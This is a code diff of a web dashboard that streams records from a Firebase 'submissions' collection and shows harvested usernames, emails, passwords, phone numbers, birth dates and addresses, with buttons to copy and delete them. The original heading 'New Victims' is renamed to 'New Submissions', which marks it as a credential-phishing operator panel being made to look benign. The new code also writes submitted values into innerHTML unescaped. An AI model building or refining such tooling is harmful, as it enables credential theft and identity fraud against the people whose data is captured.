@@ -27,7 +27,7 @@ input[type="checkbox"]{margin-right:6px;}
 
 <body>
 <div class="card">
-  <h2>🧨 New Victims</h2>
+  <h2>🧨 New Submissions</h2>
   <div style="margin-bottom:10px;">
     <button class="selectAll" onclick="selectAll()">Select All</button>
     <button class="deleteAll" onclick="deleteAll()">Delete All</button>
@@ -49,7 +49,17 @@ const db = firebase.firestore();
 const output = document.getElementById("output");
 
 let selectedDocs = new Set();
-let existingDocs = new Set(); // To track already displayed docs
+let existingDocs = new Set();
+
+const emojis = {
+  username: "💠",
+  email: "📧",
+  password: "🔑",
+  "Phone Number": "📞",
+  "Date of Birth": "🎂",
+  Address: "🏠",
+  default: "📝"
+};
 
 function copyText(text){
   navigator.clipboard.writeText(text).then(()=>alert("Copied!"));
@@ -81,17 +91,17 @@ function deleteAll(){
   }
 }
 
+// Listen for new submissions
 db.collection("submissions")
   .orderBy("createdAt","desc")
   .onSnapshot(snapshot=>{
     snapshot.forEach(doc=>{
-      if(existingDocs.has(doc.id)) return; // already displayed
+      if(existingDocs.has(doc.id)) return;
       existingDocs.add(doc.id);
 
       const data = doc.data();
       const div = document.createElement("div");
-      div.className = "item new"; // highlight new
-      div.style.transition = "background 1.5s";
+      div.className = "item new";
 
       const checkbox = document.createElement("input");
       checkbox.type = "checkbox";
@@ -103,12 +113,24 @@ db.collection("submissions")
 
       const info = document.createElement("div");
       info.className = "info";
-      info.innerHTML = `
-        <div><span class="label">1. Username / Email / Phone:</span> <span class="value">${data.username || "—"}</span></div>
-        <div><span class="label">2. Password:</span> <span class="value">${data.password || "—"}</span></div>
-        <div><span class="label">3. Extra Details:</span> <span class="value">${(data.extraFields||[]).join(", ") || "—"}</span></div>
-        <div><span class="label">4. Date:</span> <span class="value">${data.createdAt ? new Date(data.createdAt).toLocaleString() : "—"}</span></div>
-      `;
+
+      // Build display text with emojis like Telegram
+      let infoHTML = "";
+      if(data.username) infoHTML += `<div>${emojis.username} Username: <span class="value">${data.username}</span></div>`;
+      if(data.email) infoHTML += `<div>${emojis.email} Email: <span class="value">${data.email}</span></div>`;
+      if(data.password) infoHTML += `<div>${emojis.password} Password: <span class="value">${data.password}</span></div>`;
+      
+      // Extra fields
+      Object.entries(data).forEach(([k,v])=>{
+        if(["username","email","password","createdAt"].includes(k)) return;
+        const em = emojis[k] || emojis.default;
+        infoHTML += `<div>${em} ${k}: <span class="value">${v}</span></div>`;
+      });
+
+      // Submission time
+      infoHTML += `<div>⏰ Time: <span class="value">${data.createdAt ? new Date(data.createdAt).toLocaleString() : "—"}</span></div>`;
+
+      info.innerHTML = infoHTML;
 
       const btns = document.createElement("div");
       btns.className = "btns";
@@ -116,7 +138,7 @@ db.collection("submissions")
       const copyBtn = document.createElement("button");
       copyBtn.className="copy";
       copyBtn.textContent="Copy";
-      copyBtn.onclick = ()=>copyText(`Username: ${data.username || ""}\nPassword: ${data.password || ""}\nExtras: ${(data.extraFields||[]).join(", ")}`);
+      copyBtn.onclick = ()=>copyText(info.innerText);
 
       const deleteBtn = document.createElement("button");
       deleteBtn.className="delete";
@@ -132,10 +154,8 @@ db.collection("submissions")
       div.appendChild(info);
       div.appendChild(btns);
 
-      // Prepend new submissions at top
       output.prepend(div);
 
-      // Remove highlight after 3 seconds
       setTimeout(()=>{ div.classList.remove("new"); }, 3000);
     });
   });
